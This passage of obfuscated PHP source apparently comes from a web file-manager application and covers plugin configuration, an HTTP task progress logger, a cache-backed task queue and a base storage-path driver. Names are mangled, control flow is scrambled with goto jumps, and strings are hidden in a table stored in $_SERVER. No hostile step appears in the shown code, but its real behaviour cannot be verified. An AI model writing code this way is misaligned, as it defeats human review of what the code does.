$_SERVER[úÎü]; $dïŒ‰„ÓÄ“ = PLUGIN_DIR . $E¶æèìÛŸ . $B¬åÚ¹©Ğä[1756]; if (!is_array($D§È‚í¨) || !is_array($D§È‚í¨[$B¬åÚ¹©Ğä[1754]]) || $D§È‚í¨[$B¬åÚ¹©Ğä[690]] != 1 || !is_file($dïŒ‰„ÓÄ“)) { return !1; } if ($GLOBALS[$B¬åÚ¹©Ğä[474]] == 1) { return !0; } if ($aˆÀ¢¦²†õ && !Action($B¬åÚ¹©Ğä[1757])->checkAuth($E¶æèìÛŸ)) { return !1; } return !0; } public function unInstall($d¦È…ØÒ£›) { $Aøğ©è¶ô =& $_SERVER[úÎü]; $Aß´òÂ²Ö = $this->loadList($d¦È…ØÒ£›); if (file_exists(PLUGIN_DIR . $d¦È…ØÒ£›)) { Hook::apply($d¦È…ØÒ£› . $Aøğ©è¶ô[1758]); } $this->remove($Aß´òÂ²Ö[$Aøğ©è¶ô[383]]); } public function changeStatus($B‰œî¿‚†, $DŒÊœö…ÄŸ) { $fßè÷®ñ‘½ =& $_SERVER[úÎü]; $e±Ç£Šó = $this->loadList($B‰œî¿‚†); if ($DŒÊœö…ÄŸ) { Hook::apply($B‰œî¿‚† . $fßè÷®ñ‘½[1759]); } $this->update($e±Ç£Šó[$fßè÷®ñ‘½[383]], array($fßè÷®ñ‘½[1760] => $DŒÊœö…ÄŸ)); } public function appRegist($d†˜‰ß¿ßÔ, $E…ÍĞÁäñÁ) { $BŞ½œÀäŠÉ =& $_SERVER[úÎü]; $b÷ƒìëˆÔ = $this->loadList($d†˜‰ß¿ßÔ); if ($b÷ƒìëˆÔ) { $this->update($b÷ƒìëˆÔ[$BŞ½œÀäŠÉ[383]], array($BŞ½œÀäŠÉ[1754] => $E…ÍĞÁäñÁ)); } else { $aÉİ¯ò¹Ó = array($BŞ½œÀäŠÉ[28] => $d†˜‰ß¿ßÔ, $BŞ½œÀäŠÉ[1754] => $E…ÍĞÁäñÁ, $BŞ½œÀäŠÉ[690] => 0, $BŞ½œÀäŠÉ[6] => $this->getConfigDefault($d†˜‰ß¿ßÔ)); $this->insert($aÉİ¯ò¹Ó); } } public function getConfigDefault($D˜Á’’ˆå…) { $Fªœ«ôÌÎ =& $_SERVER[úÎü]; $A³÷÷ˆÈ± = array(); $C×éœ‰õÑÒ = $this->getPackageJson($D˜Á’’ˆå…); if (!$C×éœ‰õÑÒ && is_array($C×éœ‰õÑÒ[$Fªœ«ôÌÎ[1761]])) { return $A³÷÷ˆÈ±; } foreach ($C×éœ‰õÑÒ[$Fªœ«ôÌÎ[1761]] as $CÚ˜‘áÍëÛ => $e®Ï‹—Äƒ¥) { if (!isset($e®Ï‹—Äƒ¥[$Fªœ«ôÌÎ[366]]) || isset($A³÷÷ˆÈ±[$CÚ˜‘áÍëÛ])) { continue; } $A³÷÷ˆÈ±[$CÚ˜‘áÍëÛ] = $e®Ï‹—Äƒ¥[$Fªœ«ôÌÎ[366]]; } return $A³÷÷ˆÈ±; } public function getPackageJson($fŠ°šæôØÄ) { return Hook::apply($fŠ°šæôØÄ . $_SERVER[úÎü][1762]); } public function getConfig($dÖ¢Èšñâé, $DõÅ›–ëÑ = false) { $C‘ÇëÏ˜Ï =& $_SERVER[úÎü]; $A·ÊÊ•›ë± = array(); $b¨‡ƒîÌ‹É = $this->loadList($dÖ¢Èšñâé); if ($b¨‡ƒîÌ‹É && is_array($b¨‡ƒîÌ‹É[$C‘ÇëÏ˜Ï[6]])) { $A·ÊÊ•›ë± = $b¨‡ƒîÌ‹É[$C‘ÇëÏ˜Ï[6]]; } if (!$A·ÊÊ•›ë± || $DõÅ›–ëÑ) { $A·ÊÊ•›ë± = $this->getConfigDefault($dÖ¢Èšñâé); } return $A·ÊÊ•›ë±; } public function setConfig($DîÉƒŠ³µ, $fÊî‡´Ú = false) { goto b´¾´‹Ëóõ; D¶¢ê§šŞ: $this->update($câ¥÷‰ç…ã[$c¾†ÓËÓ­æ[383]], array($c¾†ÓËÓ­æ[6] => $eƒÏ©‰µ§…)); goto B‚ çŠÁ´¹; eåÁŠ…ò: $eƒÏ©‰µ§… = $câ¥÷‰ç…ã[$c¾†ÓËÓ­æ[6]]; if ($fÊî‡´Ú == !1) { $eƒÏ©‰µ§… = array(); $fÊî‡´Ú = $this->getConfigDefault($DîÉƒŠ³µ); } foreach ($fÊî‡´Ú as $B¤×ã¦ß => $BĞâŸ—Æ‡¸) { $eƒÏ©‰µ§…[$B¤×ã¦ß] = is_string($BĞâŸ—Æ‡¸) ? trim($BĞâŸ—Æ‡¸) : $BĞâŸ—Æ‡¸; } goto D¶¢ê§šŞ; b´¾´‹Ëóõ: $c¾†ÓËÓ­æ =& $_SERVER[úÎü]; $câ¥÷‰ç…ã = $this->loadList($DîÉƒŠ³µ); if (!$câ¥÷‰ç…ã) { return !1; } goto eåÁŠ…ò; B‚ çŠÁ´¹: } public function viewList() { goto F‹¼˜ø­±…; D¤Ã¯Ãô: return $CøÎ¯˜ø¿®; goto e®ÍƒŠ°Õ; c†îåÛóô: $c¼´Æİ¬Ü = $this->loadPluginList(); $CøÎ¯˜ø¿® = array(); foreach ($c¼´Æİ¬Ü as $e¶·›®ó¯ => $aöù’±Ü‚¬) { unset($aöù’±Ü‚¬[$e¨¦ÜÀ¦ç[1754]], $aöù’±Ü‚¬[$e¨¦ÜÀ¦ç[6]]); $f¿Ÿ¬‡×Àœ = PLUGIN_DIR . $aöù’±Ü‚¬[$e¨¦ÜÀ¦ç[28]] . $e¨¦ÜÀ¦ç[1756]; if (!is_file($f¿Ÿ¬‡×Àœ)) { continue; } $Aó×•ñ¸–® = Hook::apply($aöù’±Ü‚¬[$e¨¦ÜÀ¦ç[28]] . $e¨¦ÜÀ¦ç[1762]); if (is_array($Aó×•ñ¸–®)) { $CøÎ¯˜ø¿®[$e¶·›®ó¯] = array_merge($aöù’±Ü‚¬, $Aó×•ñ¸–®); } } goto D¤Ã¯Ãô; F‹¼˜ø­±…: $e¨¦ÜÀ¦ç =& $_SERVER[úÎü]; $c¼´Æİ¬Ü = $this->loadList(); $this->pluginScan($c¼´Æİ¬Ü); goto c†îåÛóô; e®ÍƒŠ°Õ: } private function loadPluginList() { $bÉö¿“”¨ª =& $_SERVER[úÎü]; $c¿£Ë°‘öó = $this->loadList(); if (strtolower(MOD) == $bÉö¿“”¨ª[1763]) { return $c¿£Ë°‘öó; } $c–…¶Ï¡´” = Hook::trigger($bÉö¿“”¨ª[1764], $c¿£Ë°‘öó); if ($c¿£Ë°‘öó && !$c–…¶Ï¡´”) { die; } return $c–…¶Ï¡´” ? $c–…¶Ï¡´” : $c¿£Ë°‘öó; } private function pluginScan($AÀŒçÖĞÉè) { $fÂÜéğ‘ÉÜ =& $_SERVER[úÎü]; recursion_dir(PLUGIN_DIR, $eË“¨ÔÌÒ, $cŠ÷‰ÏÙ, 0); foreach ($eË“¨ÔÌÒ as $E†Èìº¸¾·) { $a×™¿µäŞŒ = get_path_this($E†Èìº¸¾·); if (isset($AÀŒçÖĞÉè[$a×™¿µäŞŒ]) || !file_exists($E†Èìº¸¾· . $fÂÜéğ‘ÉÜ[1765]) || !file_exists($E†Èìº¸¾· . $fÂÜéğ‘ÉÜ[1756])) { continue; } Hook::apply($a×™¿µäŞŒ . $fÂÜéğ‘ÉÜ[1759]); } } } goto AµÖ†¿ßÑˆ; bÉª©ƒ¶×™: class TaskHttp extends Task { protected function startAfter() { $D¼¤ç¤áÏ =& $_SERVER[úÎü]; $fØº‰±µÂ‘ =& $this->task; $fØº‰±µÂ‘[$D¼¤ç¤áÏ[1550]] = 1; Hook::bind($D¼¤ç¤áÏ[1522], array($this, $D¼¤ç¤áÏ[1551])); Hook::bind($D¼¤ç¤áÏ[1524], array($this, $D¼¤ç¤áÏ[1552])); Hook::bind($D¼¤ç¤áÏ[1526], array($this, $D¼¤ç¤áÏ[1553])); } protected function endAfter() { $aó‘ŞÀñìâ =& $_SERVER[úÎü]; Hook::unbind($aó‘ŞÀñìâ[1522], array($this, $aó‘ŞÀñìâ[1551])); Hook::unbind($aó‘ŞÀñìâ[1524], array($this, $aó‘ŞÀñìâ[1552])); Hook::unbind($aó‘ŞÀñìâ[1526], array($this, $aó‘ŞÀñìâ[1553])); } public function progressStart($bãïÀš») { $F‚ËÂÍç¼» =& $_SERVER[úÎü]; $AÛÏäªù„ = curl_getinfo($bãïÀš»); self::log($F‚ËÂÍç¼»[1554] . $AÛÏäªù„[$F‚ËÂÍç¼»[301]]); self::valueSet($this->task[$F‚ËÂÍç¼»[383]], $this->task); } public function progressEnd($CàùİÍ¦ò) { $fò¯é¢Ú£ =& $_SERVER[úÎü]; self::log($fò¯é¢Ú£[1555] . $this->task[$fò¯é¢Ú£[383]]); $this->end(); } public function progress($b×‹ÂÅÅóä, $Aç¿§Œ²Êî, $d’áµ¯¹”£, $B×²ªŒ×, $Dğ÷¯„¼¤®) { $DÃù²ƒƒğˆ =& $_SERVER[úÎü]; $f÷Üµ ‹ë® =& $this->task; if ($Dğ÷¯„¼¤® > 0) { $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]] = $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]] == 0 ? $B×²ªŒ× : $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]]; $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[996]] = $Dğ÷¯„¼¤®; } else { if ($d’áµ¯¹”£ > 0) { $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]] = $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]] == 0 ? $Aç¿§Œ²Êî : $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[982]]; $f÷Üµ ‹ë®[$DÃù²ƒƒğˆ[996]] = $d’áµ¯¹”£; } } $this->update(); self::log("\160\162\157\147\x72\x65\x73\163\x48\x74\164\160\x3a\144\157\x77\156\x3a{$d’áµ¯¹”£}\x2f{$Aç¿§Œ²Êî}\x3b\x20\x75\160\x6c\157\x61\x64\x3a{$Dğ÷¯„¼¤®}\x2f{$B×²ªŒ×}\73"); } } class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\x61\x73\x6b\121\165\x65\165\x65\x4c\145\x6e\147\164\150"; const QUEUE_DATA = "\164\x61\x73\x6b\121\165\x65\165\x65\104\x61\164\x61"; public static function initTask() { } public static function add($aÁŸ„äßé©, $eñÁø°¨èŠ = array(), $a˜î×½‚Ö = '', $cÉğ°öîƒ = '') { goto cò²Õ½„Ïğ; e£ïä‡µó¼: if ($cÉğ°öîƒ && array_find_by_field($Fšæùí­ºğ, $FÈóš•ğ¬[89], $cÉğ°öîƒ)) { return !0; } $Fšæùí­ºğ[] = array($FÈóš•ğ¬[258] => $aÁŸ„äßé©, $FÈóš•ğ¬[1556] => $eñÁø°¨èŠ, $FÈóš•ğ¬[421] => $a˜î×½‚Ö, $FÈóš•ğ¬[89] => $cÉğ°öîƒ); write_log($FÈóš•ğ¬[1557] . $a˜î×½‚Ö, $FÈóš•ğ¬[1558]); goto D¼âë¿«Ü‘; D¼âë¿«Ü‘: self::setAll($Fšæùí­ºğ); return !0; goto A‚Ğ°ö ; cò²Õ½„Ïğ: $FÈóš•ğ¬ =& $_SERVER[úÎü]; if (self::count() >= self::MAX_LENGTH) { return !1; } $Fšæùí­ºğ = self::getAll(); goto e£ïä‡µó¼; A‚Ğ°ö : } public static function run() { goto F§›ÇáŠšÊ; F§›ÇáŠšÊ: $a÷°í¾’®„ =& $_SERVER[úÎü]; $fÜ­•„Í = self::getAll(); $AˆçëÀ™Œ§ = array_shift($fÜ­•„Í); goto b¤È·ŞÇ‘’; b¤È·ŞÇ‘’: if (!$AˆçëÀ™Œ§) { return !1; } self::setAll($fÜ­•„Í); write_log($a÷°í¾’®„[1559] . $AˆçëÀ™Œ§[$a÷°í¾’®„[421]], $a÷°í¾’®„[1558]); goto aÈçÅ©ÎíÑ; aÈçÅ©ÎíÑ: try { $E‹ö‚ñï = Hook::apply($AˆçëÀ™Œ§[$a÷°í¾’®„[258]], $AˆçëÀ™Œ§[$a÷°í¾’®„[1556]]); } catch (Exception $F¼ØÁˆ¨Úƒ) { } write_log($a÷°í¾’®„[1560] . $AˆçëÀ™Œ§[$a÷°í¾’®„[421]], $a÷°í¾’®„[1558]); return !0; goto E†¨à†«ŸÎ; E†¨à†«ŸÎ: } public static function count() { $B­•ˆ°×Ø« = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$B­•ˆ°×Ø«) { return 0; } return intval($B­•ˆ°×Ø«); } public static function getAll() { $eæÎö‘ˆ¥ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$eæÎö‘ˆ¥) { return array(); } return $eæÎö‘ˆ¥; } public static function setAll($d»„…ïù†) { $f‚ÈĞŠ›ˆ• = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($d»„…ïù†), $f‚ÈĞŠ›ˆ•); Cache::set(self::QUEUE_DATA, $d»„…ïù†, $f‚ÈĞŠ›ˆ•); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } $Bä¥ƒô°Ö = $_SERVER[$_SERVER[úÎü][833]]; goto A¨öĞÇ˜¾; c§”ª°ÕİÂ: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $C›ôµ†…èØ =& $_SERVER[úÎü]; $this->objectDriver = array($C›ôµ†…èØ[57], $C›ôµ†…èØ[58], $C›ôµ†…èØ[59], $C›ôµ†…èØ[60], $C›ôµ†…èØ[61], $C›ôµ†…èØ[62], $C›ôµ†…èØ[63], $C›ôµ†…èØ[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($CîÈÈ–Â•İ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($CîÈÈ–Â•İ, $_SERVER[úÎü][8]); } return $CîÈÈ–Â•İ; } public function iconvApp($F¢ˆíÑˆÚË) { return $F¢ˆíÑˆÚË; } public function iconvSystem($A©¤´–¦š) { return $A©¤´–¦š; } public function iconvTo($dÊ”ø‡ìÎ•, $f×öÕÑğ·, $f…İÈ“É¡) { goto BÕåäè‰Ñ; AÙŸ´ë: return $F¼˜»½Ú»µ; goto e–ÍÖñ Öõ; aÚƒù³‡ˆ°: $F™´ë»ƒˆ˜[$f…İÈ“É¡ . $e‰°Ñ´‹µ[66] . $f×öÕÑğ· . $e‰°Ñ´‹µ[67] . $dÊ”ø‡ìÎ•] = $dÊ”ø‡ìÎ•; $F™´ë»ƒˆ˜[$f…İÈ“É¡ . $e‰°Ñ´‹µ[66] . $f×öÕÑğ· . $e‰°Ñ´‹µ[67] . $F¼˜»½Ú»µ] = $dÊ”ø‡ìÎ•; $F™´ë»ƒˆ˜[$f×öÕÑğ· . $e‰°Ñ´‹µ[66] . $f…İÈ“É¡ . $e‰°Ñ´‹µ[67] . $F¼˜»½Ú»µ] = $F¼˜»½Ú»µ; goto AÙŸ´ë; F‘¸¿¾á†÷: $fÓ«£§õ«ğ = $f×öÕÑğ· . $e‰°Ñ´‹µ[66] . $f…İÈ“É¡ . $e‰°Ñ´‹µ[67] . $dÊ”ø‡ìÎ•; if (isset($F™´ë»ƒˆ˜[$fÓ«£§õ«ğ])) { return $F™´ë»ƒˆ˜[$fÓ«£§õ«ğ]; } if (function_exists($e‰°Ñ´‹µ[68])) { $F¼˜»½Ú»µ = @mb_convert_encoding($dÊ”ø‡ìÎ•, $f…İÈ“É¡, $f×öÕÑğ·); } else { $F¼˜»½Ú»µ = @iconv($f×öÕÑğ·, $f…İÈ“É¡, $dÊ”ø‡ìÎ•); } goto a”ÓœÖÖê¡; a”ÓœÖÖê¡: $F¼˜»½Ú»µ = $F¼˜»½Ú»µ ? $F¼˜»½Ú»µ : $dÊ”ø‡ìÎ•; if (strstr($F¼˜»½Ú»µ, $e‰°Ñ´‹µ[69])) { $F¼˜»½Ú»µ = str_replace($e‰°Ñ´‹µ[69], $e‰°Ñ´‹µ[70], $F¼˜»½Ú»µ); } $F™´ë»ƒˆ˜[$f×öÕÑğ· . $e‰°Ñ´‹µ[66] . $f…İÈ“É¡ . $e‰°Ñ´‹µ[67] . $dÊ”ø‡ìÎ•] = $F¼˜»½Ú»µ; goto aÚƒù³‡ˆ°; BÕåäè‰Ñ: $e‰°Ñ´‹µ =& $_SERVER[úÎü]; if (!$dÊ”ø‡ìÎ• || !function_exists($e‰°Ñ´‹µ[65])) { return $dÊ”ø‡ìÎ•; } static $F™´ë»ƒˆ˜ = array(); goto F‘¸¿¾á†÷; e–ÍÖñ Öõ: } public function getPathInner($dÄòÑ©âß’) { $EéÆÂ²»ÒÊ = IO::init($dÄòÑ©âß’); return $EéÆÂ²»ÒÊ->path; } public function getPathOuter($bÉ‚»â­õ) { $fÛô“¦Şè =& $_SERVER[úÎü]; $a†Õ·À‘¨í = strlen(trim($this->pathBase, $fÛô“¦Şè[8])); $bÉ‚»â­õ = substr(trim($bÉ‚»â­õ, $fÛô“¦Şè[8]), $a†Õ·À‘¨í); return $this->pathDriver . $fÛô“¦Şè[8] . ltrim($bÉ‚»â­õ, $fÛô“¦Şè[8]); } public function isParentOf($eÆõºò×æÊ, $DÏÓéÌ·¥ò) { $eæ°«Ñ§ö’ =& $_SERVER[úÎü]; $eÆõºò×æÊ = rtrim(strtolower($eÆõºò×æÊ), $eæ°«Ñ§ö’[8]) . $eæ°«Ñ§ö’[8]; $DÏÓéÌ·¥ò = rtrim(strtolower($DÏÓéÌ·¥ò), $eæ°«Ñ§ö’[8]) . $eæ°«Ñ§ö’[8]; $BøĞ¡ƒé”ï = strpos($DÏÓéÌ·¥ò, $eÆõºò×æÊ) === 0; return $BøĞ¡ƒé”ï; } public function getType() { $eàã¸›ÓÊÚ =& $_SERVER[úÎü]; $fèá†ÂŸ¼° = str_replace($eàã¸›ÓÊÚ[71], $eàã¸›ÓÊÚ[33], get_class($this)); return strtolower($fèá†ÂŸ¼°); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($F—ÆÊÌ…Ô, $BçñĞ™á) { $eï¾÷Ÿè¢ß =& $_SERVER[úÎü]; $a‘šÜŞ•¹Î = rtrim($F—ÆÊÌ…Ô, $eï¾÷Ÿè¢ß[8]) . $eï¾÷Ÿè¢ß[8] . $BçñĞ™á; $c³æ»«ÜÃ = $this->exist($a‘šÜŞ•¹Î); return $c³æ»«ÜÃ ? $a‘šÜŞ•¹Î : !1; } public function setModifyTime($D¨ÛŠÔ¢Ï‹, $d¶İš²Ã¹¢ = '') { } public function renameObject($eÕÜ¥‰ ×, $EÊŠÄ×¡ò°) { goto fèß‡†Ûö»; fèß‡†Ûö»: $b‹ç¬«Å™à =& $_SERVER[úÎü]; $B†ÉÔáË‰› = $EÊŠÄ×¡ò°; Hook::trigger($b‹ç¬«Å™à[72], $this, $eÕÜ¥‰ ×, $this, $this->pathFather($eÕÜ¥‰ ×) . $EÊŠÄ×¡ò°); goto cä‰îÕÑ›Ó; cä‰îÕÑ›Ó: $eÕÜ¥‰ × = $this->getPathOuter($eÕÜ¥‰ ×); $EÊŠÄ×¡ò° = $this->pathFather($eÕÜ¥‰ ×) . $EÊŠÄ×¡ò°; if (IO::isFile($eÕÜ¥‰ ×)) { $E„ÒŠùí¦ = IO::copy($eÕÜ¥‰ ×, $this->pathFather($eÕÜ¥‰ ×), REPEAT_RENAME_FOLDER, $B†ÉÔáË‰›); if ($E„ÒŠùí¦) { IO::remove($eÕÜ¥‰ ×); } } else { $E„ÒŠùí¦ = IO::mkdir($EÊŠÄ×¡ò°); if (!$E„ÒŠùí¦) { return !1; } $aœˆ´÷™‘‚ = IO::listPath($eÕÜ¥‰ ×, !0); $AÑáÜó¨† = array_merge($aœˆ´÷™‘‚[$b‹ç¬«Å™à[73]], $aœˆ´÷™‘‚[$b‹ç¬«Å™à[74]]); foreach ($AÑáÜó¨† as $AÁÚÌìÂ©) { IO::move($AÁÚÌìÂ©[$b‹ç¬«Å™à[75]], $EÊŠÄ×¡ò°, REPEAT_RENAME_FOLDER); } IO::remove($eÕÜ¥‰ ×); } goto bÅ¹Ï¾µˆğ; bÅ¹Ï¾µˆğ: return $E„ÒŠùí¦ ? $EÊŠÄ×¡ò° : !1; goto fßíå´çÅ¹; fßíå´çÅ¹: } public function tempFile($eÂ£ˆÌÖŸ¸ = '', $B¥ˆ±ÇÆ»§ = '') { goto fÓàîŒŠãÉ; Cá¹õ©Àï‹: $e­ÎÆØ¥Êé = $C›åÀÊ¡Û¥ . $eÂ£ˆÌÖŸ¸; @touch($e­ÎÆØ¥Êé); if ($B¥ˆ±ÇÆ»§) { file_put_contents($e­ÎÆØ¥Êé, $B¥ˆ±ÇÆ»§); } goto BŠ”Š¦£Š±; fÓàîŒŠãÉ: if (!$eÂ£ˆÌÖŸ¸) { $eÂ£ˆÌÖŸ¸ = rand_string(15); } $C›åÀÊ¡Û¥ = TEMP_FILES . rand_string(15) . $_SERVER[úÎü][8]; @mkdir($C›åÀÊ¡Û¥, 511, !0); goto Cá¹õ©Àï‹; BŠ”Š¦£Š±: return $e­ÎÆØ¥Êé; goto CˆÛŒ„íÊ; CˆÛŒ„íÊ: } public function tempFileRemve($A÷Ò½Ó®âİ) { @unlink($A÷Ò½Ó®âİ); @rmdir($this->pathFather($A÷Ò½Ó®âİ)); } public function mkfile($C…„ÊÌºÉ, $AŠËÏØ¯ªé = '', $dÊÄ¤©˜¥İ = REPEAT_RENAME) { } public function mkdir($bÎËæÖ¦ß´, $AÂíŠ‹÷Ÿì = REPEAT_SKIP) { } public function delFile($Fñ‹‚éËÍ„) { } public function delFolder($A¢»…’­ó) { } public function copyFile($a¶ãÚŸØ›¼, $DŸİñ˜…Íë) { } public function moveFile($bƒŸ±ˆùö—, $e²ë¹æë¶®) { } public function remove($d¡ÛÉÇ¶›ã) { if ($this->isFile($d¡ÛÉÇ¶›ã)) { return $this->delFile($d¡ÛÉÇ¶›ã); } return $this->delFolder($d¡ÛÉÇ¶›ã); } public function rename($aÑ¹±©¬‘ä, $AÎÔœäÛ…÷) { } public function exist($aùÆ½Ó¥õÕ) { } public function findByHash($aÂãæ¾ï = '', $BÊ˜ëáÂ = '') { return !1; } public function isFile($E¦£š¨ì) { } public function isFolder($b·Í†ãğÅ¡) { } public function size($féÖ‡ƒ©³ø) { } public function info($AÇ„ìÖÕ«) { } public function infoSimple($a‹ÁƒÕò³Ã) { return $this->info($a‹ÁƒÕò³Ã); } public function infoAuth($Cáî¼‡Ó½) { return $this->info($Cáî¼‡Ó½); } public function infoFull($Eè«äñ‘‘ˆ) { return $this->info($Eè«äñ‘‘ˆ); } public function infoWithChildren($FŞ‚Ì’È³) { $D‘ØãÑÜ…Ê =& $_SERVER[úÎü]; static $e…âŞù­‚Î = array(); if (isset($e…âŞù­‚Î[$FŞ‚Ì’È³])) { return $e…âŞù­‚Î[$FŞ‚Ì’È³]; } $AØ³âø¹â“ = $this->info($FŞ‚Ì’È³); if ($AØ³âø¹â“ && $AØ³âø¹â“[$D‘ØãÑÜ…Ê[29]] == $D‘ØãÑÜ…Ê[76]) { $d•Ïª´Şæ = array($D‘ØãÑÜ…Ê[77] => 0, $D‘ØãÑÜ…Ê[78] => 0, $D‘ØãÑÜ…Ê[79] => 0); $this->infoChildren($FŞ‚Ì’È³, $d•Ïª´Şæ); $AØ³âø¹â“[$D‘ØãÑÜ…Ê[77]] = $d•Ïª´Şæ[$D‘ØãÑÜ…Ê[77]]; $AØ³âø¹â“[$D‘ØãÑÜ…Ê[80]] = array($D‘ØãÑÜ…Ê[81] => $d•Ïª´Şæ[$D‘ØãÑÜ…Ê[78]], $D‘ØãÑÜ…Ê[82] => $d•Ïª´Şæ[$D‘ØãÑÜ…Ê[79]]); $e…âŞù­‚Î[$FŞ‚Ì’È³] = $AØ³âø¹â“; } return $AØ³âø¹â“; } public function listPath($E«ã–ÕËË, $BïŒ”êµ› = false) { } public function has($F×å®›†—¯, $EÖ“Ü¤å¼İ = false, $aÈÇ¸†ŞË = false) { } public function canRead($C£·Ç·„™) { } public function canWrite($EŒÀËêóÒ) { } public function getContent($a¸¹„¼Ãæ) { } public function setContent($D‘—¸Ğ™¾”, $có¸ğ©”–Ì = '') { } protected function infoChildren($b¿Û½©ˆŠ², &$cÑ¤İï¯î¾) { $b„·ÚÔ×¨¿ =& $_SERVER[úÎü]; check_abort_echo(); $E–µ¡½›Í¡ = $this->listPath($b¿Û½©ˆŠ², !0); $E–µ¡½›Í¡ = array_merge($E–µ¡½›Í¡[$b„·ÚÔ×¨¿[74]], $E–µ¡½›Í¡[$b„·ÚÔ×¨¿[73]]); foreach ($E–µ¡½›Í¡ as $DíÇÑä¬) { if ($DíÇÑä¬[$b„·ÚÔ×¨¿[29]] == $b„·ÚÔ×¨¿[76]) { $cÑ¤İï¯î¾[$b„·ÚÔ×¨¿[79]]++; $c¡”Š©öó¶ = $this->getPathInner($DíÇÑä¬[$b„·ÚÔ×¨¿[75]]); $this->infoChildren($c¡”Š©öó¶, $cÑ¤İï¯î¾); } else { $cÑ¤İï¯î¾[$b„·ÚÔ×¨¿[78]]++; $cÑ¤İï¯î¾[$b„·ÚÔ×¨¿[77]] += $DíÇÑä¬[$b„·ÚÔ×¨¿[77]]; } } } public function fileSubstr($DØå¨ŠÁ¶…, $dÙ‚›—ˆ§è, $BŸÜ…ÆÀ·°) { } public function listAll($DÅ‹…‚÷Ø›) { } public function upload($B„²²â¼Š², $CÚ…Áˆ¡ó½, $eí´õÈÂîõ = false, $e¤—ôŸÈ‡ = REPEAT_REPLACE) { } public function uploadFileByID($A¼ƒØ·Î¶•, $BÇ†ô µÄ‡, $f‘ìÃç) { } public function uploadFileByPath($d•œ¢Àá¶, $Bç³…ïä¢, $c…›Ñ·«ø¨ = array()) { } public function isUploadServer() { $a©§øåò =& $_SERVER[úÎü]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $a©§øåò[83]) { return !0; } return $GLOBALS[$a©§øåò[6]][$a©§øåò[84]][$a©§øåò[85]]; } public function isFileOutServer() { $A–°ÇºÁïë =& $_SERVER[úÎü]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $A–°ÇºÁïë[83]) { return !0; } return $GLOBALS[$A–°ÇºÁïë[6]][$A–°ÇºÁïë[84]][$A–°ÇºÁïë[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($cÇŒáÈ…—á) { $c„“¸ÔØÍ =& $_SERVER[úÎü]; if (!$this->isCdnHost()) { return $cÇŒáÈ…—á; } return str_replace(trim(get_url_root($cÇŒáÈ…—á), $c„“¸ÔØÍ[8]), trim($this->cdnHost, $c„“¸ÔØÍ[8]), $cÇŒáÈ…—á); } public function uploadLink($CÛì®ã—–†, $a¸ùøÓ× = 0) { goto fÌªÙßª³; C½Å§Ûë‰º: if ($AöÍ å„¹à) { $AöÍ å„¹à[$bÅ“á§Œó±[89]] = $CÛì®ã—–†; $AöÍ å„¹à[$bÅ“á§Œó±[90]] = $e®‘š‰æÄ’; } return $AöÍ å„¹à; goto f…àÀ˜ôÑ; c„ùÜÕ—˜: $dÈæ©ÇŸ†‰ = $a¸ùøÓ× <= $A²–ø¾Å ? $bÅ“á§Œó±[87] : $bÅ“á§Œó±[88]; $cš»ÁÀÈ†£ = (!$a¸ùøÓ× ? 1 : ceil($a¸ùøÓ× / pow(1024, 3))) * 3600 * 4; $AöÍ å„¹à = $this->{$dÈæ©ÇŸ†‰}($CÛì®ã—–†, $cš»ÁÀÈ†£); goto C½Å§Ûë‰º; dğŠùÌŠ: if (!in_array($e®‘š‰æÄ’, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A²–ø¾Å = 1024 * 1024 * 10; goto c„ùÜÕ—˜; fÌªÙßª³: $bÅ“á§Œó± =& $_SERVER[úÎü]; if ($this->isUploadServer()) { return; } $e®‘š‰æÄ’ = $this->getType(); goto dğŠùÌŠ; f…àÀ˜ôÑ: } public function uploadFormData($féá—‡©¼», $C½±î‚Œø = 3600) { } public function multiUploadFormData($F¸Ëíõßƒ¸, $fÔŠİÅÚº­ = 3600) { } public function download($FÊ³—£†‚“, $CÀ‹ĞåÅÕ) { } public function ext($AÏ™³îÎÒÕ) { $fÖéšÔÕ‚ =& $_SERVER[úÎü]; if (strpos($AÏ™³îÎÒÕ, $fÖéšÔÕ‚[8]) === -1) { $fåç‘›ß™ô = $AÏ™³îÎÒÕ; } else { $fåç‘›ß™ô = $this->pathThis($AÏ™³îÎÒÕ); } $d“–©•öâ = $fÖéšÔÕ‚[33]; if (strstr($fåç‘›ß™ô, $fÖéšÔÕ‚[91])) { $d“–©•öâ = substr($fåç‘›ß™ô, strrpos($fåç‘›ß™ô, $fÖéšÔÕ‚[91]) + 1); $d“–©•öâ = strtolower($d“–©•öâ); } if (strlen($d“–©•öâ) > 3 && preg_match($fÖéšÔÕ‚[92], $d“–©•öâ, $F‹õó¨¸Õ)) { $d“–©•öâ = $fÖéšÔÕ‚[33]; } return $d“–©•öâ; } public function pathThis($Då‡È‚¼¥) { $F‚«¤«—‹Ü =& $_SERVER[úÎü]; $Då‡È‚¼¥ = str_replace($F‚«¤«—‹Ü[93], $F‚«¤«—‹Ü[8], rtrim($Då‡È‚¼¥, $F‚«¤«—‹Ü[8])); $Fí‚ßµ´µé = strrpos($Då‡È‚¼¥, $F‚«¤«—‹Ü[8]); if ($Fí‚ßµ´µé === !1) { return $Då‡È‚¼¥; } return substr($Då‡È‚¼¥, 